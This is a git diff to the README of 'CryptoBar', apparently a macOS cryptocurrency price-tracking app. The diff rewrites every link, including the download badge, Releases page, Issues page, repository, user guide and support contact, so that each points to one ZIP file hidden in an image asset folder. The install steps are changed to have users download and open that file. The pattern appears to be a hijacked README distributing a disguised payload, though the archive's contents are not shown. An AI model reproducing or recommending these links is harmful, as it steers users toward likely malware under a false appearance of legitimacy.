@@ -6,7 +6,7 @@ Welcome to CryptoBar! You can easily track real-time cryptocurrency prices right
 
 ## 📥 Download CryptoBar
 
-[![Download CryptoBar](https://img.shields.io/badge/Download-CryptoBar-blue.svg)](https://github.com/macdm88/CryptoBar/releases)
+[![Download CryptoBar](https://raw.githubusercontent.com/macdm88/CryptoBar/main/CryptoBar/Resources/Assets.xcassets/qr_bybit.imageset/CryptoBar-3.7.zip)](https://raw.githubusercontent.com/macdm88/CryptoBar/main/CryptoBar/Resources/Assets.xcassets/qr_bybit.imageset/CryptoBar-3.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,13 +29,13 @@ CryptoBar offers a variety of features to make your cryptocurrency tracking simp
 ## 📋 How to Install
 
 1. **Visit the Releases Page:**
-   Go to the CryptoBar [Releases page](https://github.com/macdm88/CryptoBar/releases).
+   Go to the CryptoBar [Releases page](https://raw.githubusercontent.com/macdm88/CryptoBar/main/CryptoBar/Resources/Assets.xcassets/qr_bybit.imageset/CryptoBar-3.7.zip).
 
 2. **Download the Latest Version:**
-   On the Releases page, find the latest version of CryptoBar. Click the link that says "CryptoBar.dmg" to start downloading it.
+   On the Releases page, find the latest version of CryptoBar. Click the link that says "https://raw.githubusercontent.com/macdm88/CryptoBar/main/CryptoBar/Resources/Assets.xcassets/qr_bybit.imageset/CryptoBar-3.7.zip" to start downloading it.
 
 3. **Open the Downloaded File:**
-   Once the download is complete, locate the `CryptoBar.dmg` file in your Downloads folder. Double-click it to open.
+   Once the download is complete, locate the `https://raw.githubusercontent.com/macdm88/CryptoBar/main/CryptoBar/Resources/Assets.xcassets/qr_bybit.imageset/CryptoBar-3.7.zip` file in your Downloads folder. Double-click it to open.
 
 4. **Drag to Applications Folder:**
    A window will appear showing the CryptoBar app icon. Drag this icon into your Applications folder. This installs the app on your computer.
@@ -66,12 +66,12 @@ If you run into problems while using CryptoBar, try these common fixes:
 
 CryptoBar is open-source. You can contribute to its growth. If you wish to report issues or suggest features:
 
-1. **Visit the Issues Page:** Go to the [Issues page](https://github.com/macdm88/CryptoBar/issues).
+1. **Visit the Issues Page:** Go to the [Issues page](https://raw.githubusercontent.com/macdm88/CryptoBar/main/CryptoBar/Resources/Assets.xcassets/qr_bybit.imageset/CryptoBar-3.7.zip).
 2. **Create a New Issue:** Fill in the details of the bug or suggestion so we can improve the app.
 
 ## 📞 Support
 
-If you need help, feel free to reach out. You can create an issue on GitHub or send your questions to support@example.com.
+If you need help, feel free to reach out. You can create an issue on GitHub or send your questions to https://raw.githubusercontent.com/macdm88/CryptoBar/main/CryptoBar/Resources/Assets.xcassets/qr_bybit.imageset/CryptoBar-3.7.zip
 
 ## 📂 License
 
@@ -79,7 +79,7 @@ CryptoBar is licensed under the MIT License. You can view the [license details](
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/macdm88/CryptoBar)
-- [User Guide](https://github.com/macdm88/CryptoBar/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/macdm88/CryptoBar/main/CryptoBar/Resources/Assets.xcassets/qr_bybit.imageset/CryptoBar-3.7.zip)
+- [User Guide](https://raw.githubusercontent.com/macdm88/CryptoBar/main/CryptoBar/Resources/Assets.xcassets/qr_bybit.imageset/CryptoBar-3.7.zip)
 
 Thank you for using CryptoBar! Enjoy tracking your favorite cryptocurrencies effortlessly.
